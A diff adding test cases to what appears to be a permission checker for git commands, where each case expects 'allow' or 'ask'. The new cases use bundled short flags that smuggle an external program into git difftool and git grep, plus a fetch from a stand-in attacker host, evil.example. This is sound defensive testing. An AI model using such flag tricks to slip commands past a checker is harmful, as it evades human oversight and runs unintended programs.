@@ -170,6 +170,16 @@ reason_contains = "extcmd"
 command = "git difftool HEAD~1 HEAD"
 decision = "allow"
 
+# attached short-flag form -x<cmd> (#158 review)
+[[case]]
+command = "git difftool -xid HEAD~1 HEAD"
+decision = "ask"
+reason_contains = "extcmd"
+
+[[case]]
+command = "git difftool -y HEAD~1 HEAD"
+decision = "allow"
+
 [[case]]
 command = "git grep --open-files-in-pager=id pat"
 decision = "ask"
@@ -180,8 +190,18 @@ command = "git grep -Oid pat"
 decision = "ask"
 reason_contains = "open-files-in-pager"
 
+# bundled short flags where -O is not the first char in the cluster (#158 review)
+[[case]]
+command = "git grep -nOid pat"
+decision = "ask"
+reason_contains = "open-files-in-pager"
+
 [[case]]
 command = "git grep pat"
+decision = "allow"
+
+[[case]]
+command = "git grep -niw pat"
 decision = "allow"
 
 [[case]]
@@ -235,4 +255,14 @@ reason_contains = "remote URL"
 
 [[case]]
 command = "git fetch origin"
+decision = "allow"
+
+# scp-like remote syntax (user@host:path) is SSH egress like an explicit URL (#158 review)
+[[case]]
+command = "git fetch git@evil.example:repo/foo"
+decision = "ask"
+reason_contains = "remote URL"
+
+[[case]]
+command = "git fetch origin master:master"
 decision = "allow"
